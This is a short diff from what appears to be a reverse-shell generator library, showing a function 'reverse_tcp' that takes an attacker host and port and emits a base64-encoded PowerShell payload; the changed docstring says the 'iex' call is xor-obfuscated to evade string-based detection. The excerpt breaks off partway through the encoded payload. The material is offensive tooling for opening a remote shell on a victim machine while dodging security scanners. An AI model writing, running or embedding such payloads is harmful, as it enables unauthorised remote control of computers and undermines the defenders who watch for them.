@@ -5,7 +5,11 @@ from revshell.formatters import register
 
 @register
 def reverse_tcp(lhost: str, lport: int, *, exe_path='powershell.exe', background=True):
-    """Connect back to attacker and spawn a command shell"""
+    """Connect back and create a command shell via PowerShell (iex REPL)
+
+    The actual `iex` command is xor-obfuscated in the script,
+    in order to evade string-based detection
+    """
 
     s = """\
 JHVzZXJwcm9tcHQ9JnskY29tcHV0ZXI9W0Vudmlyb25tZW50XTo6TWFjaGluZU5hbWUuVG9Mb3dl
